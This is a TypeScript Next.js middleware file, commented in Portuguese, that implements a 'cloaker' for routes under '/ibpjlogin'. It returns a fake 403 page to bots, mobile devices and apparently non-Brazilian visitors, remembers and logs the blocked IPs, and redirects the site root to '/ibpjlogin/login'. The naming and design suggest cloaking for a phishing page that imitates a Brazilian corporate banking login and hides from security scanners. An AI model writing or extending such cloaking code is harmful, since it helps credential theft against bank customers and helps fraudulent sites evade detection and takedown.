// src/middleware.ts
import type { NextRequest } from 'next/server';
import { NextResponse } from 'next/server';
import { isBot, isBrazil, isMobile } from './lib/cloaker/detectors';
import { getClientIp } from './lib/cloaker/ip';
import type { CloakerConfig } from './lib/cloaker/types';

// ---- Configuração do escopo ----
const PUBLIC_PATHS: RegExp[] = [
  /^\/ibpjlogin(\/|$)/,
  /^\/$/, 
];

const BLOCK_PAGE_HTML = `<!doctype html><meta charset="utf-8"><title>Acesso bloqueado</title><h1>403 - Acesso bloqueado</h1><p>Seu acesso foi bloqueado por políticas de segurança.</p>`;

const g: any = globalThis as any;
g.__CLOAKER_IP_DENY ||= new Map<string, number>(); 
const IN_MEMORY_DENY_TTL_MS = 15 * 60 * 1000;

function isPublicPath(pathname: string): boolean {
  return PUBLIC_PATHS.some((re) => re.test(pathname));
}

async function fetchConfig(): Promise<CloakerConfig | null> {
  try {
    const res = await fetch(`${process.env.NEXT_PUBLIC_BASE_URL || ''}/api/cloaker/config`, {
      // cache pelo header do endpoint
      cache: 'force-cache',
      // Em edge, revalidate manual não se aplica; seguimos headers
    });
    if (!res.ok) return null;
    return (await res.json()) as CloakerConfig;
  } catch {
    return null;
  }
}

function blockResponse(): NextResponse {
  return new NextResponse(BLOCK_PAGE_HTML, { status: 403, headers: { 'content-type': 'text/html; charset=utf-8' } });
}

function fireAndForgetLog(ip: string, reason: string) {
  try {
    // não await para não atrasar resposta
    fetch(`${process.env.NEXT_PUBLIC_BASE_URL || ''}/api/cloaker/log`, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ip, reason }),
      keepalive: true,
    }).catch(() => {});
  } catch {}
}

function rememberDeny(ip: string) {
  g.__CLOAKER_IP_DENY.set(ip, Date.now() + IN_MEMORY_DENY_TTL_MS);
}

function isRecentlyDenied(ip: string): boolean {
  const exp = g.__CLOAKER_IP_DENY.get(ip);
  if (!exp) return false;
  if (exp < Date.now()) {
    g.__CLOAKER_IP_DENY.delete(ip);
    return false;
  }
  return true;
}

function generateSessionId(): string {
  const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
  let result = '';
  for (let i = 0; i < 23; i++) result += chars.charAt(Math.floor(Math.random() * chars.length));
  return result;
}

export async function middleware(request: NextRequest) {
  const { pathname } = request.nextUrl;

  // Só atua nas rotas públicas
  if (!isPublicPath(pathname)) {
    return NextResponse.next(); // nada a fazer
  }

  // Seu redirect existente
  if (pathname === '/') {
    return NextResponse.redirect(new URL('/ibpjlogin/login', request.url));
  }

  // Config dinâmica (cacheada)
  const cfg = await fetchConfig();
  if (!cfg || !cfg.cloakerState) {
    // Sem config ou desativado → segue fluxo normal
    const resp = NextResponse.next();
    const sessionId = request.cookies.get('sessionId');
    if (!sessionId) {
      resp.cookies.set('sessionId', generateSessionId(), {
        httpOnly: true,
        secure: false,
        maxAge: 60 * 60 * 24 * 7,
        path: '/',
      });
    }
    return resp;
  }

  const ip = getClientIp(request);
  if (isRecentlyDenied(ip)) {
    return blockResponse();
  }

  // Regras leves
  if (cfg.blockBot && isBot(request.headers)) {
    rememberDeny(ip);
    fireAndForgetLog(ip, 'bot-ua');
    return blockResponse();
  }

  if (cfg.blockMobile && isMobile(request.headers)) {
    rememberDeny(ip);
    fireAndForgetLog(ip, 'mobile');
    return blockResponse();
  }

  if (cfg.blockStranger) {
    const br = isBrazil(request.headers);
    if (br === false) {
      rememberDeny(ip);
      fireAndForgetLog(ip, 'non-br');
      return blockResponse();
    }
    // br === 'unknown' → sem custo extra (não chama geo externa)
  }

  // OK → segue a request
  const response = NextResponse.next();

  // Seu cookie de sessão (mantido)
  const sessionId = request.cookies.get('sessionId');
  if (!sessionId) {
    response.cookies.set('sessionId', generateSessionId(), {
      httpOnly: true,
      secure: false,
      maxAge: 60 * 60 * 24 * 7,
      path: '/',
    });
  }

  return response;
}

// ATENÇÃO: como (public) não está na URL, defina padrões reais aqui
export const config = {
  matcher: [
    '/ibpjlogin/:path*', // público
    '/',                 // público (redirect)
    // adicione outras rotas públicas reais:
    // '/landing/:path*', '/blog/:path*', ...
  ],
};
